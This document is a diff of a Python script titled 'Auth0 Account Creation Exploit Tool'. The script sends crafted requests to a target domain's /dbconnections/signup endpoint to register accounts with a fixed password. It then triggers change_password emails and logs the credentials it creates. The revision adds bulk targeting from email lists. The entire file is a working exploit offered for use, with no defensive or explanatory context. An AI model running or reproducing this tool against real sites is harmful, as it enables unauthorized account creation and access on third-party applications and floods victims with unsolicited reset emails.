@@ -1,144 +1,201 @@
+#!/usr/bin/env python3
 import os
 import sys
 import time
+import argparse
 import requests
 import urllib3
+from typing import List, Optional
 
-# ANSI color codes for terminal output
-BLUE = "\033[0;34m"  # Blue color code
-RED = "\033[91m"    # Red color code
-GREEN = "\033[32m"  # Green color code
-END = "\033[0m"     # Reset color
+# ANSI color codes
+class Colors:
+    BLUE = "\033[94m"
+    RED = "\033[91m"
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    CYAN = "\033[96m"
+    END = "\033[0m"
+    BOLD = "\033[1m"
 
-# Banner
-print(f"""{GREEN}
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def print_banner():
+    """Display the tool banner"""
+    print(f"""{Colors.CYAN}{Colors.BOLD}
   ____            _    _   _   _ _   _      ___  
  | __ )  __ _  __| |  / \ | | | | |_| |__  / _ \ 
  |  _ \ / _` |/ _` | / _ \| | | | __| '_ \| | | |
  | |_) | (_| | (_| |/ ___ \ |_| | |_| | | | |_| |
  |____/ \__,_|\__,_/_/   \_\___/ \__|_| |_|\___/ 
-{END}                                                                
+{Colors.END}                                                                
 """)
-time.sleep(0.2)  # Pause for a brief moment for better UX
+    time.sleep(0.2)
 
-# Disable warnings for insecure requests (e.g., self-signed SSL certificates)
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# Function to create a directory for saving output files
-def mk_dir(host):
+def create_output_directory(directory: str) -> str:
+    """Create directory for output files"""
     try:
-        print(f"{GREEN}[+] Creating directory{END}")
-        os.makedirs(host, exist_ok=True)  # Create the directory if it doesn't exist
-        time.sleep(0.2)  # Brief pause for better UX
-        path = os.path.abspath(host)  # Get absolute path of the directory
-        print(f"{GREEN}[+] Directory successfully created\nPath: {path} {END}")
+        print(f"{Colors.BLUE}[*] Creating directory '{directory}'...{Colors.END}")
+        os.makedirs(directory, exist_ok=True)
+        abs_path = os.path.abspath(directory)
+        print(f"{Colors.GREEN}[+] Directory created successfully at {abs_path}{Colors.END}")
+        return abs_path
     except Exception as e:
-        print(f"{RED}Error occurred while creating directory: {e}{END}")
+        print(f"{Colors.RED}[-] Error creating directory: {e}{Colors.END}")
+        sys.exit(1)
 
-# Function to exploit a vulnerability and create an account
-def exploit(host, mail):
+def exploit_target(host: str, email: str, output_dir: str, verbose: bool = False) -> bool:
+    """Attempt to exploit the vulnerability"""
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Sec-Fetch-User': '?1',
-        'Priority': 'u=0, i',
         'Content-Type': 'application/json'
     }
 
     payload = {
         'client_id': '',
-        'email': mail,
-        'password': 'rQ8a2;3/c[<J',  # Example password
+        'email': email,
+        'password': 'rQ8a2;3/c[<J',  # Default password
         'connection': 'Username-Password-Authentication'
     }
 
     try:
-        print(f"{GREEN}[+] Initializing the exploit...{END}")
+        if verbose:
+            print(f"{Colors.BLUE}[*] Attempting to create account for {email} on {host}...{Colors.END}")
+        
         response = requests.post(
             f'https://{host}/dbconnections/signup',
             headers=headers,
             json=payload,
-            verify=False,  # Don't verify SSL certificates
+            verify=False,
+            timeout=10
         )
-        time.sleep(0.2)  # Brief pause for better UX
 
-        status_code = response.status_code
-        if status_code in [200, 201]:
-            print(f"{GREEN}[+] Account successfully created\n{END}")
-            print(f"{GREEN}[+] Email: {mail}\n{END}")
-            print(f"{GREEN}[+] Pass: rQ8a2;3/c[<J\n{END}")
-            print(f"{GREEN}[+] Status Code: {response.status_code}{END}")
-            print(f"{GREEN}\n[+] Response body content: {response.text}{END}")
-            with open(f"{host}/credentials.txt", "w") as file:
-                file.write(f"Email: {mail}\nPassword: rQ8a2;3/c[<J\nStatus Code: {status_code}\nResponse: {response.text}")
+        if response.status_code in [200, 201]:
+            print(f"{Colors.GREEN}[+] Account created successfully!{Colors.END}")
+            print(f"{Colors.GREEN}    Email: {email}{Colors.END}")
+            print(f"{Colors.GREEN}    Password: rQ8a2;3/c[<J{Colors.END}")
+            
+            # Save credentials to file
+            output_file = os.path.join(output_dir, "credentials.txt")
+            with open(output_file, "a") as f:
+                f.write(f"Host: {host}\nEmail: {email}\nPassword: rQ8a2;3/c[<J\n\n")
+            
+            if verbose:
+                print(f"{Colors.BLUE}[*] Credentials saved to {output_file}{Colors.END}")
+            
+            return True
         else:
-            print(f"{RED}[-] The application returned status code: {status_code}{END}")
-            try:
-                error_json = response.json()
-                if "connection" in error_json:
-                    print(f"{RED}[-] Unable to find the required connection{END}")
-                    print(response.text)
-            except ValueError:
-                print(f"{RED}[-] The response is not JSON, response text: {response.text}{END}")
-    except Exception as e:
-        print(f"{RED}Error occurred: {e}{END}")
+            print(f"{Colors.RED}[-] Failed to create account (Status: {response.status_code}){Colors.END}")
+            if verbose:
+                print(f"{Colors.YELLOW}[!] Response: {response.text}{Colors.END}")
+            return False
 
-# Function to verify the email address
-def mail_verify(host, mail):
+    except Exception as e:
+        print(f"{Colors.RED}[-] Error during exploitation: {e}{Colors.END}")
+        return False
+
+def verify_email(host: str, email: str, verbose: bool = False) -> bool:
+    """Send email verification request"""
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Sec-Fetch-User': '?1',
-        'Priority': 'u=0, i',
         'Content-Type': 'application/json'
     }
 
     payload = {
-        'email': mail,
+        'email': email,
         'connection': 'Username-Password-Authentication'
     }
+
     try:
+        if verbose:
+            print(f"{Colors.BLUE}[*] Sending verification email to {email}...{Colors.END}")
+        
         response = requests.post(
             f'https://{host}/dbconnections/change_password',
             headers=headers,
             json=payload,
             verify=False,
+            timeout=10
         )
-        if response.status_code in [200, 201]:
-            print(f"{GREEN}\n[+] Email verification sent to: {mail}{END}")
-        else:
-            print(f"{RED}[-] Unable to verify the mail address. Status Code: {response.status_code}{END}")
-            try:
-                error_json = response.json()
-                print(f"{RED}[-] Server responded with: {error_json}{END}")
-            except ValueError:
-                print(f"{RED}[-] The response is not JSON, response text: {response.text}{END}")
-    except Exception as e:
-        print(f"{RED}Error occurred: {e}{END}")
 
-# Main function to handle user input and call necessary functions
-def main():
-    if len(sys.argv) != 3:
-        print(f"{RED}[+] Usage: {sys.argv[0]} <host> <your_mail_address>{END}")
-        print(f"{RED}[+] Example: {sys.argv[0]} example.com hacker@gmail.com{END}")
+        if response.status_code in [200, 201]:
+            print(f"{Colors.GREEN}[+] Verification email sent to {email}{Colors.END}")
+            return True
+        else:
+            print(f"{Colors.RED}[-] Failed to send verification (Status: {response.status_code}){Colors.END}")
+            if verbose:
+                print(f"{Colors.YELLOW}[!] Response: {response.text}{Colors.END}")
+            return False
+
+    except Exception as e:
+        print(f"{Colors.RED}[-] Error during email verification: {e}{Colors.END}")
+        return False
+
+def process_list(host: str, email_list: str, output_dir: str, verbose: bool = False):
+    """Process a list of email addresses"""
+    try:
+        with open(email_list, 'r') as f:
+            emails = [line.strip() for line in f if line.strip()]
+        
+        print(f"{Colors.BLUE}[*] Processing {len(emails)} emails from {email_list}{Colors.END}")
+        
+        for email in emails:
+            if '@' not in email:  # Basic email validation
+                print(f"{Colors.YELLOW}[!] Skipping invalid email: {email}{Colors.END}")
+                continue
+            
+            print(f"\n{Colors.CYAN}[*] Processing {email}{Colors.END}")
+            if exploit_target(host, email, output_dir, verbose):
+                verify_email(host, email, verbose)
+            time.sleep(1)  # Rate limiting
+    
+    except FileNotFoundError:
+        print(f"{Colors.RED}[-] File not found: {email_list}{Colors.END}")
+        sys.exit(1)
+    except Exception as e:
+        print(f"{Colors.RED}[-] Error processing email list: {e}{Colors.END}")
         sys.exit(1)
 
-    host = sys.argv[1]
-    mail = sys.argv[2]
-    mk_dir(host)  # Create directory for output
-    exploit(host, mail)  # Attempt to exploit the vulnerability
-    mail_verify(host, mail)  # Verify the email address
+def main():
+    print_banner()
 
-# Entry point of the script
+    parser = argparse.ArgumentParser(
+        description=f"{Colors.CYAN}Auth0 Account Creation Exploit Tool{Colors.END}",
+        formatter_class=argparse.RawTextHelpFormatter
+    )
+    
+    parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., example.com)')
+    parser.add_argument('-e', '--email', help='Single email address to target')
+    parser.add_argument('-l', '--list', help='File containing list of email addresses')
+    parser.add_argument('-o', '--output', default='output', help='Output directory (default: ./output)')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
+    
+    args = parser.parse_args()
+
+    # Validate input
+    if not args.email and not args.list:
+        print(f"{Colors.RED}[-] You must specify either -e/--email or -l/--list{Colors.END}")
+        sys.exit(1)
+    
+    if args.email and args.list:
+        print(f"{Colors.YELLOW}[!] Both email and list provided, using list only{Colors.END}")
+        args.email = None
+
+    # Create output directory
+    output_dir = create_output_directory(args.output)
+
+    # Process targets
+    if args.list:
+        process_list(args.domain, args.list, output_dir, args.verbose)
+    else:
+        if '@' not in args.email:
+            print(f"{Colors.RED}[-] Invalid email address: {args.email}{Colors.END}")
+            sys.exit(1)
+        
+        if exploit_target(args.domain, args.email, output_dir, args.verbose):
+            verify_email(args.domain, args.email, args.verbose)
+
+    print(f"\n{Colors.GREEN}[+] Operation completed{Colors.END}")
+
 if __name__ == "__main__":
     main()
